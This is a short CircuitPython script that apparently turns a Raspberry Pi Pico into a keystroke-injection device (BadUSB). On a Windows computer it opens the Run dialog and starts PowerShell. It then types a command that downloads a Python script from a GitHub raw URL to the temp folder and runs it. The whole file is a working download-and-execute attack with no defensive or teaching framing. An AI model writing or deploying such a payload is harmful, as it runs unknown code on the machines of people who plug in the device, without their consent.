import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

time.sleep(1)

keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

def slow_write(text, delay=0.02):
    for c in text:
        layout.write(c)
        time.sleep(delay)

# Open Run dialog
keyboard.send(Keycode.WINDOWS, Keycode.R)
time.sleep(0.7)

# Open PowerShell
slow_write("powershell")
keyboard.send(Keycode.ENTER)
time.sleep(1)

# Download file
slow_write("iwr https://raw.githubusercontent.com/gethin101/stats_pico/refs/heads/main/script.py ")
time.sleep(0.1)

# Save to temp
slow_write("-OutFile $env:TEMP/script.py; ")
time.sleep(0.1)

# Run it
slow_write("py $env:TEMP/script.py")

keyboard.send(Keycode.ENTER)
